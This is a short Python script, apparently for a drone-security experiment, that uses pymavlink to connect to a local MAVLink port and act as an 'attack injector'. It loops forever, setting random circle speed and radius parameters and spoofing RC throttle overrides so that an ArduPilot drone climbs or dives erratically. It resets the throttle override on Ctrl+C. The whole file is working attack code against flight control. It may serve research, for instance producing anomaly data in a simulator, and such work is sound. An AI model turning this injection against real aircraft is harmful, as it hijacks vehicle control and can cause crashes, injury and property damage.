import time
import random
from pymavlink import mavutil

# Connect to M4's dedicated attack port
connection = mavutil.mavlink_connection('udpin:127.0.0.1:14552')

print("Waiting for drone heartbeat...")
connection.wait_heartbeat()
print("Connected! M4 Attack Injector is now randomizing Speed, Radius, and Altitude.")

try:
    while True:
        # 1. RANDOMIZE SPEED (15 to 60 degrees/second)
        speed = random.randint(15, 60)
        connection.mav.param_set_send(
            connection.target_system, connection.target_component,
            b'CIRCLE_RATE', speed, mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        )
        
        # 2. RANDOMIZE RADIUS (10 to 50 meters)
        # We send both name variants to ensure it works on your specific ArduPilot version
        radius = random.randint(1000, 5000) 
        connection.mav.param_set_send(
            connection.target_system, connection.target_component,
            b'CIRCLE_RAD', radius, mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        )
        connection.mav.param_set_send(
            connection.target_system, connection.target_component,
            b'CIRCLE_RADIUS', radius, mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        )
        
        # 3. RANDOMIZE ALTITUDE (Spoofing the RC Throttle)
        # 1500 is neutral. 1700 forces a climb. 1300 forces a dive.
        throttle_pwm = random.choice([1300, 1500, 1700])
        
        # Send the RC override (Channel 3 is the Throttle). 
        # The '0's mean we leave all other controls (pitch/roll/yaw) alone.
        connection.mav.rc_channels_override_send(
            connection.target_system, connection.target_component,
            0, 0, throttle_pwm, 0, 0, 0, 0, 0
        )

        # Print what the injector is doing
        alt_action = "Climbing" if throttle_pwm == 1700 else "Diving" if throttle_pwm == 1300 else "Holding Level"
        print(f"[M4 INJECT] Speed: {speed} deg/s | Radius: {radius/100}m | Altitude: {alt_action}")
        
        # Wait a random amount of time (2 to 5 seconds) before the next erratic movement
        time.sleep(random.randint(2, 5))

except KeyboardInterrupt:
    # CRITICAL SAFETY RESET: If you press Ctrl+C, this releases the spoofed throttle 
    # so the drone doesn't crash into the ground.
    connection.mav.rc_channels_override_send(
        connection.target_system, connection.target_component,
        0, 0, 0, 0, 0, 0, 0, 0
    )
    print("\n[M4] Injector stopped. Control returned to normal ArduPilot systems.")
